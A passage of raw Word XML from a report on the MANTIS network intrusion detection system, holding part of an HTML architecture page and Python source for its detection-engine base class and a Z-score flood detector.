    </w:p>
    <w:p w14:paraId="15B88FC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646FD353" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="310B0CC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 class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF681F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&lt;span class="method-tag"&gt;Reputation lookup&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE4BFB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&lt;strong&gt;Known malicious hosts&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289C9BC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Uses a memory-efficient Bloom filter to test source addresses against a configured blacklist before the remaining analysis is completed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B115E0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04516E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4301D43F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38383EE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&lt;h3&gt;Response and reporting&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D282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&lt;p&gt;Each detection is assigned a severity and risk score, enriched with MITRE ATT&amp;amp;CK metadata where applicable, then forwarded to the local SIEM interface. If active defence is explicitly enabled, high-confidence detections can be passed to the host firewall for blocking.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E667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502FFA7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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA7E7B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 &lt;!-- End of tab-architecture --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537049F1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15D177D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&lt;/div&gt; &lt;!-- End of main-content --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEE81E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&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF9D010" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59AFAD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&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4393C6D4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="173F9C4B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Detection Engines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5BA496"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src/engines/base.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC6094D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>83 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745F9D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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1332986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"""Common contract shared by every MANTIS detection engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170C7085" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5345696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All engines implement a uniform interface exposing analyse(), train(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E921A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export_brain(), and import_brain() methods. The sensor composes an abstract</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BDEF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DetectionEngine rather than depending on five unrelated implementations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA61C70" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E9DC3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The benefit is concrete rather than cosmetic: because the sensor and the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1568157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evaluation harness both talk to `analyse()` and `train()`, a sixth engine can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550C65B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be added by writing one subclass, with no change to the sensor orchestrator,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A74ED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the evaluator, or the brain serialisation code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48883F68" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DF566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Each engine keeps its original domain-specific method (`classify`,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6C0D0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`calculate_baseline`, `check`) so existing callers and unit tests are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3CD5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unaffected; `analyse()` is a thin uniform adapter over that method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDC66A4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="485A83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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5379BB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0013F2DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1858B2FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DD7A8A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Verdict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756D98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"""Uniform result returned by every engine's analyse() method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087D771A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="504ECA5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label      - engine specific verdict string ("Scan", "Malicious", "DDoS")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B4E6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confidence - 0.0..1.0 where available, else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0D3B2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detail     - engine specific extras (matched keywords, neighbours, z value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A3A55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is_threat  - True when the label represents an attack for this engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0A77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B846C5B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="323DB6B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__slots__ = ("label", "confidence", "detail", "is_threat")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0497C4FB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D6C88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__init__(self, label, confidence=None, detail=None, is_threat=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C2723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self.label = label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A466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self.confidence = confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130775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self.detail = detail if detail is not None else {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203932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self.is_threat = is_threat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D48BB81" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A4E14E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as_dict(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="208603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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50355E1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"label": self.label,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A66A8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"confidence": self.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F51F65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"detail": self.detail,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466560C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"is_threat": self.is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3F341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5BF6414" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A6F0C7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__repr__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513CEED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 = "n/a" if self.confidence is None else "%.3f" % self.confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A48D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"&lt;Verdict %s conf=%s threat=%s&gt;" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DE9CB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self.label, conf, self.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2F31DB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="509897CB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09041CB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DetectionEngine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCD72E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"""Abstract base class for the five MANTIS engines."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBD5E55" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74D8C40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name = "engine"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE663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what this engine consumes, used for documentation and the evaluator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33911A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features = ()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B75F10" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75C6DB1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analyse(self, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CF682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"""Evaluate one observation and return a Verdict."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DC85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raise NotImplementedError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F4A2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 must implement analyse()" % type(self).__name__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011CAC7C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4411C0D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train(self, samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782040B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"""Learn from an iterable of labelled samples. Returns a summary dict.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085E8EE9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E9D34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Engines that are purely online (Z-Score, Bloom) override this with</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF69A2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their own accumulation behaviour.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1284D79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D4E59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raise NotImplementedError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C9613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 must implement train()" % type(self).__name__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A38B24" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E1DD03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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C912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"""Serialise learned state to a JSON-safe dict."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D9F6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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D564B5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D853E8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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBCCBE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"""Restore learned state from export_brain() output."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E68D3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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC386D0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0717B6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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C5E28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"""Drop learned state, returning the engine to its seeded defaults."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49903D0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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D82AD55"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lastRenderedPageBreak/>
        <w:t>src/engines/z_score.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594063A7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>264 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163BEC5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collections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E683F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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D60B98D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52BB19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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECE6E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from engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006E985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except ImportError:  # allow `python engines/z_score.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD75EE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from base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5FC1B2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0696947C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59CB078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MinimalistStats(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEBAB0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"""Volumetric flood detection from packets-per-second statistics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580C9969" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76662C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Two estimators run side by side:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CB1460" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31D9725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 bounded rolling window (deque, maxlen=window_size) giving the *recent*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E03D6F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mean and standard deviation, so the baseline adapts when legitimate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745B4C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traffic shifts and old behaviour is forgotten;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9490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Welford's online algorithm (Welford, 1962) maintaining the mean and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77715E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variance of the entire session in constant space, updated incrementally</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53379E3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per observation with no stored history.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BDC681" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6674F5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Welford is used because the naive "sum of squares minus square of sum"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFB9A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formulation loses catastrophic precision once the running totals grow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626AA56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large, which is exactly the regime a flood produces. Welford instead</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3057911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accumulates the second central moment directly:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A652BAB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="064907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     &lt;- n + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB4850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delta &lt;- x - mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A60CD6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mean  &lt;- mean + delta / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB4395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M2    &lt;- M2 + delta * (x - mean_new)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53097BE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var   &lt;- M2 / n                       (population variance)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE41674" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="223E347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The rolling window remains the operational detector because it must forget</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476E6D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old traffic. Welford figures provide stable session-wide statistics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7268C60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8824680" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78D7607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name = "z_score"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799C5F0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features = ("packets_per_second",)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF6EA41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6185C7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 single outlier inside a population of n samples can never score higher</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6452F8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than (n-1)/sqrt(n). With the default window of 30 that ceiling is 5.29,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1C010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but it collapses toward the threshold as an attack fills the window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7360827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MIN_WARMUP = 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587A2B61" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61DF16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__init__(self, window_size=30, threshold=3.0, guard_baseline=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4678E73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min_pps=500, required_consecutive=1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274C1C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self.window_size = window_size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEA5D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self.threshold = threshold</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13233E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 high Z-score only means "unusual for this host". Requiring a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2FB3B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meaningful absolute packet rate prevents small changes such as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230DA6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10 -&gt; 50 PPS from being mislabeled as a volumetric DDoS attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC5F3D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self.min_pps = max(0, float(min_pps))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E27B33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self.required_consecutive = max(1, int(required_consecutive))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2412ABA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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5016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guard_baseline=False reproduces the naive estimator for comparison</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8507C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self.guard_baseline = guard_baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C895E0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self.history = collections.deque(maxlen=window_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE9E7FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6476025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Welford accumulators (whole session, constant memory)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E45BD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self.count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7476FF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self.w_mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1433B18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self.w_m2 = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2E69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self.peak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75931F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self.suppressed = 0     # observations kept out of the baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282F722B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F3BA9C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@property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EECD5B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max_detectable_z(self):</w:t>
